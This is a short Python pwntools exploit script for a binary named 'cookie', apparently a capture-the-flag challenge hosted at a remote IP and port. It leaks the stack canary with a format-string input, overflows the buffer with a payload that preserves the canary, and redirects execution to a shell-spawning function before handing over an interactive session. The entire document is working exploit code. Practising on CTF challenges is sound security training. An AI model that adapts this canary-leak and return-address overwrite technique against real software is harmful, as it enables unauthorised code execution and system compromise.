from pwn import *
elf = ELF('/home/kali/Downloads/cookie')
p=elf.process()

cyberedu = '35.246.200.178:31782'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    


pop_rdi_ret = 0x400883
ret = 0x4005d6

getshell = 0x400737

p.recvuntil(b"Hacker!\n")
p.sendline(b"%21$p")

canary=p.recvline().strip()
print(canary)
canary=int(canary,16)

print(f"canary: {hex(canary)}")

payload = (b"a"*104 + #buf
           p64(canary) +
           b"r"*8 +
           p64(ret) +
           p64(getshell)
           )

p.sendline(payload)

p.interactive()
